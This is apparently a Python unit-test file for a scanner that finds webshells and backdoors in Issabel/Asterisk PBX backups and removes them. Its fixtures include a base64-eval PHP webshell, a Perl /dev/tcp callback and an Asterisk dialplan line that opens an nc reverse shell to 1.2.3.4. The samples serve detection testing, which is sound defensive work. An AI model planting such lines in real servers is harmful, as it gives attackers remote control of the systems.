import os
import tarfile
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

import security_scan as scan

CLEAN_PHP = b"<?php echo 'oi'; ?>"
EVIL_PHP = b"<?php $x = base64_decode($_POST['x']); eval($x); ?>"


def _run_result(returncode=0, stdout=""):
    result = Mock()
    result.returncode = returncode
    result.stdout = stdout
    return result


class ScanSignatureFileTest(unittest.TestCase):
    def _write(self, tmp_dir, name, content):
        path = Path(tmp_dir, name)
        path.write_bytes(content)
        return str(path)

    def test_clean_file_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", CLEAN_PHP)
            finding = scan._scan_signature_file(path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao")
        self.assertIsNone(finding)

    def test_obfuscated_signature_is_suspicious(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "shell.php", EVIL_PHP)
            finding = scan._scan_signature_file(path, "shell.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao")
        self.assertEqual(finding.level, "suspeito")
        self.assertEqual(finding.reason, "ofuscacao")

    def test_known_bad_name_alone_is_suspicious(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "salem.php", CLEAN_PHP)
            finding = scan._scan_signature_file(path, "salem.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao")
        self.assertEqual(finding.level, "suspeito")
        self.assertEqual(finding.reason, "nome conhecido do incidente")

    def test_known_bad_name_plus_signature_combines_reasons_and_skips_rpm_check(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch("security_scan.rpm_confirms_clean") as mock_rpm:
            path = self._write(tmp, "salem.php", EVIL_PHP)
            finding = scan._scan_signature_file(path, "salem.php", "admin.tgz", "/var/www/html", scan.PHP_SIG_RE, "ofuscacao")
        self.assertEqual(finding.level, "suspeito")
        self.assertIn("nome conhecido do incidente", finding.reason)
        self.assertIn("ofuscacao", finding.reason)
        mock_rpm.assert_not_called()

    def test_rpm_confirmation_clears_a_signature_only_suspicion(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch("security_scan.rpm_confirms_clean", return_value=True):
            path = self._write(tmp, "index.php", EVIL_PHP)
            finding = scan._scan_signature_file(path, "index.php", "admin.tgz", "/var/www/html", scan.PHP_SIG_RE, "ofuscacao")
        self.assertEqual(finding.level, "ok")

    def test_baseline_confirmation_clears_a_signature_only_suspicion(self):
        # baseline agora é a tabela estática KNOWN_GOOD_HASHES (hardcoded),
        # não mais um arquivo -- nunca requer 2 backups (1 confiável só pra
        # gerar baseline + 1 pra analisar de fato).
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", EVIL_PHP)
            digest = __import__("hashlib").sha256(EVIL_PHP).hexdigest()
            with patch("security_scan.rpm_confirms_clean", return_value=False), \
                 patch.dict(scan.KNOWN_GOOD_HASHES, {"admin.tgz:index.php": digest}, clear=True):
                finding = scan._scan_signature_file(
                    path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao",
                )
        self.assertEqual(finding.level, "ok")

    def test_centralized_trust_clears_a_signature_only_suspicion(self):
        import hashlib
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", EVIL_PHP)
            digest = hashlib.sha256(EVIL_PHP).hexdigest()
            trusted = {"admin.tgz:index.php": {"sha256": digest, "origem": "remoto"}}
            with patch("security_scan.rpm_confirms_clean", return_value=False):
                finding = scan._scan_signature_file(
                    path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao",
                    trusted_by_path=trusted,
                )
        self.assertEqual(finding.level, "ok")
        self.assertIn("trust", finding.reason)
        self.assertIn("rede", finding.reason)

    def test_centralized_trust_names_local_origin_too(self):
        import hashlib
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", EVIL_PHP)
            digest = hashlib.sha256(EVIL_PHP).hexdigest()
            trusted = {"admin.tgz:index.php": {"sha256": digest, "origem": "local"}}
            with patch("security_scan.rpm_confirms_clean", return_value=False):
                finding = scan._scan_signature_file(
                    path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao",
                    trusted_by_path=trusted,
                )
        self.assertEqual(finding.level, "ok")
        self.assertIn("local", finding.reason)

    def test_centralized_trust_does_not_clear_when_the_hash_no_longer_matches(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", EVIL_PHP)
            trusted = {"admin.tgz:index.php": {"sha256": "a" * 64, "origem": "remoto"}}
            with patch("security_scan.rpm_confirms_clean", return_value=False):
                finding = scan._scan_signature_file(
                    path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao",
                    trusted_by_path=trusted,
                )
        self.assertEqual(finding.level, "suspeito")

    def test_no_trusted_by_path_given_behaves_like_before(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, "index.php", EVIL_PHP)
            with patch("security_scan.rpm_confirms_clean", return_value=False):
                finding = scan._scan_signature_file(path, "index.php", "admin.tgz", None, scan.PHP_SIG_RE, "ofuscacao")
        self.assertEqual(finding.level, "suspeito")


class RpmConfirmsCleanTest(unittest.TestCase):
    def test_returns_false_when_rpm_is_not_installed(self):
        with patch("security_scan.shutil.which", return_value=None):
            self.assertFalse(scan.rpm_confirms_clean("/var/www/html/index.php", b"x"))

    def test_returns_false_when_file_does_not_belong_to_any_package(self):
        with patch("security_scan.shutil.which", return_value="/usr/bin/rpm"), \
             patch("security_scan.subprocess.run", return_value=_run_result(returncode=1)):
            self.assertFalse(scan.rpm_confirms_clean("/var/www/html/index.php", b"x"))

    def test_returns_true_when_hash_matches_the_package_manifest(self):
        content = b"conteudo original"
        expected = __import__("hashlib").sha256(content).hexdigest()

        def fake_run(args, **kwargs):
            if "-qf" in args:
                return _run_result(stdout="issabel-pbx-5.0.0-1\n")
            if "FILEDIGESTALGO" in args[-1]:
                return _run_result(stdout="8")
            return _run_result(stdout=f"/var/www/html/index.php {expected}\n")

        with patch("security_scan.shutil.which", return_value="/usr/bin/rpm"), \
             patch("security_scan.subprocess.run", side_effect=fake_run):
            self.assertTrue(scan.rpm_confirms_clean("/var/www/html/index.php", content))

    def test_returns_false_when_hash_diverges_from_the_package_manifest(self):
        def fake_run(args, **kwargs):
            if "-qf" in args:
                return _run_result(stdout="issabel-pbx-5.0.0-1\n")
            if "FILEDIGESTALGO" in args[-1]:
                return _run_result(stdout="8")
            return _run_result(stdout="/var/www/html/index.php outrohash\n")

        with patch("security_scan.shutil.which", return_value="/usr/bin/rpm"), \
             patch("security_scan.subprocess.run", side_effect=fake_run):
            self.assertFalse(scan.rpm_confirms_clean("/var/www/html/index.php", b"conteudo"))


class ScanDirectoryTest(unittest.TestCase):
    def _build(self, tmp):
        root = Path(tmp, "root")
        root.mkdir()
        (root / "index.php").write_bytes(CLEAN_PHP)
        (root / "shell.php").write_bytes(EVIL_PHP)
        (root / "backdoor.pl").write_text("system('/dev/tcp/1.2.3.4/4444')")
        (root / "extensions.conf").write_text("exten => 1,1,System(nc -e /bin/sh 1.2.3.4 4444)\n")
        return str(root)

    def test_php_only_mode_ignores_scripts_and_dialplan(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._build(tmp)
            findings = scan.scan_directory(root, "admin.tgz", mode="php_only")
        labels = {f.path for f in findings}
        self.assertIn("shell.php", labels)
        self.assertNotIn("backdoor.pl", labels)
        self.assertFalse(any("extensions.conf" in f.path for f in findings))

    def test_scripts_mode_includes_scripts_but_not_dialplan(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._build(tmp)
            findings = scan.scan_directory(root, "agi-bin.tgz", mode="scripts")
        labels = {f.path for f in findings}
        self.assertIn("shell.php", labels)
        self.assertIn("backdoor.pl", labels)
        self.assertFalse(any("extensions.conf" in f.path for f in findings))

    def test_full_mode_includes_dialplan(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._build(tmp)
            findings = scan.scan_directory(root, "etc.asterisk.tgz", mode="full")
        self.assertTrue(any("extensions.conf" in f.path for f in findings))

    def test_clean_directory_produces_no_findings(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp, "root")
            root.mkdir()
            (root / "index.php").write_bytes(CLEAN_PHP)
            findings = scan.scan_directory(str(root), "admin.tgz", mode="full")
        self.assertEqual(findings, [])


class ScanBackupTest(unittest.TestCase):
    def _build_backup(self, path, with_absolute_symlink=False):
        with tempfile.TemporaryDirectory() as work:
            admin_dir = Path(work, "admin")
            admin_dir.mkdir()
            (admin_dir / "index.php").write_bytes(CLEAN_PHP)
            (admin_dir / "shell.php").write_bytes(EVIL_PHP)
            if with_absolute_symlink:
                # o admin/ real do Issabel tem link simbólico absoluto
                # legítimo (ex.: admin/assets/recordings -> /var/spool/...) --
                # o filtro "data" novo do tarfile rejeita isso com erro.
                (admin_dir / "recordings").symlink_to("/var/spool/asterisk/monitor")
            admin_tgz = Path(work, "var.www.html.admin.tgz")
            with tarfile.open(admin_tgz, "w:gz") as tar:
                tar.add(admin_dir, arcname=".")

            backup_dir = Path(work, "backup")
            backup_dir.mkdir()
            (backup_dir / "var.www.html.admin.tgz").write_bytes(admin_tgz.read_bytes())
            with tarfile.open(path, "w") as tar:
                tar.add(backup_dir, arcname="backup")

    def test_scan_backup_flags_the_evil_file_inside_the_admin_blob(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch("security_scan.rpm_confirms_clean", return_value=False):
            path = str(Path(tmp, "x.tar"))
            self._build_backup(path)
            result = scan.scan_backup(path)

        self.assertEqual(result["blobs_scanned"], ["var.www.html.admin.tgz"])
        suspects = [f for f in result["findings"] if f.level == "suspeito"]
        self.assertEqual(len(suspects), 1)
        self.assertEqual(suspects[0].path, "shell.php")

    def test_scan_backup_tolerates_a_legitimate_absolute_symlink(self):
        # achado ao vivo: admin/assets/recordings do Issabel real é link
        # simbólico absoluto -- extração ingênua crashava em vez de só
        # ignorar (a varredura só lê conteúdo de arquivo regular).
        with tempfile.TemporaryDirectory() as tmp, \
             patch("security_scan.rpm_confirms_clean", return_value=False):
            path = str(Path(tmp, "x.tar"))
            self._build_backup(path, with_absolute_symlink=True)
            result = scan.scan_backup(path)

        suspects = [f for f in result["findings"] if f.level == "suspeito"]
        self.assertEqual(len(suspects), 1)
        self.assertEqual(suspects[0].path, "shell.php")

    def test_scan_backup_without_code_blobs_reports_none_scanned(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = str(Path(tmp, "x.tar"))
            with tempfile.TemporaryDirectory() as work:
                backup_dir = Path(work, "backup")
                backup_dir.mkdir()
                (backup_dir / "mysql_db.tgz").write_text("nao eh codigo")
                with tarfile.open(path, "w") as tar:
                    tar.add(backup_dir, arcname="backup")
            result = scan.scan_backup(path)
        self.assertEqual(result["blobs_scanned"], [])
        self.assertEqual(result["findings"], [])


class PruneBackupTest(unittest.TestCase):
    def _build_backup(self, path):
        with tempfile.TemporaryDirectory() as work:
            admin_dir = Path(work, "admin")
            admin_dir.mkdir()
            (admin_dir / "index.php").write_bytes(CLEAN_PHP)
            (admin_dir / "shell.php").write_bytes(EVIL_PHP)
            admin_tgz = Path(work, "var.www.html.admin.tgz")
            with tarfile.open(admin_tgz, "w:gz") as tar:
                tar.add(admin_dir, arcname="admin")

            backup_dir = Path(work, "backup")
            backup_dir.mkdir()
            (backup_dir / "var.www.html.admin.tgz").write_bytes(admin_tgz.read_bytes())
            (backup_dir / "mysql_db.tgz").write_text("nao eh codigo, nunca eh tocado")
            with tarfile.open(path, "w") as tar:
                tar.add(backup_dir, arcname="backup")

    def _list_admin_files(self, path):
        with tarfile.open(path) as tar, tempfile.TemporaryDirectory() as tmp:
            extract_dir = scan._extract_blob(tar, "backup/var.www.html.admin.tgz", tmp)
            return sorted(
                os.path.relpath(os.path.join(dp, f), extract_dir)
                for dp, _, files in os.walk(extract_dir) for f in files
            )

    def test_removes_only_the_given_finding_and_keeps_the_rest(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = str(Path(tmp, "x.tar"))
            self._build_backup(path)
            finding = scan.Finding("suspeito", "var.www.html.admin.tgz", "admin/shell.php", "ofuscacao")
            removed = scan.prune_backup(path, [finding])

            self.assertEqual(removed, 1)
            self.assertEqual(self._list_admin_files(path), ["admin/index.php"])

    def test_untouched_blobs_survive_intact(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = str(Path(tmp, "x.tar"))
            self._build_backup(path)
            finding = scan.Finding("suspeito", "var.www.html.admin.tgz", "admin/shell.php", "ofuscacao")
            scan.prune_backup(path, [finding])

            with tarfile.open(path) as tar:
                content = tar.extractfile("backup/mysql_db.tgz").read()
        self.assertEqual(content, b"nao eh codigo, nunca eh tocado")

    def test_removing_nothing_reports_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = str(Path(tmp, "x.tar"))
            self._build_backup(path)
            removed = scan.prune_backup(path, [])
        self.assertEqual(removed, 0)


class VerdictTest(unittest.TestCase):
    def test_suspicious_when_any_finding_is_suspicious(self):
        result = {"findings": [scan.Finding("suspeito", "admin.tgz", "shell.php", "ofuscacao")], "blobs_scanned": ["var.www.html.admin.tgz"]}
        level, _ = scan.verdict(result)
        self.assertEqual(level, "error")

    def test_ok_when_blobs_were_scanned_and_nothing_suspicious(self):
        result = {"findings": [], "blobs_scanned": ["var.www.html.admin.tgz"]}
        level, _ = scan.verdict(result)
        self.assertEqual(level, "ok")

    def test_ok_when_no_code_blobs_present_at_all(self):
        result = {"findings": [], "blobs_scanned": []}
        level, text = scan.verdict(result)
        self.assertEqual(level, "ok")
        self.assertIn("não inclui", text)


if __name__ == "__main__":
    unittest.main()
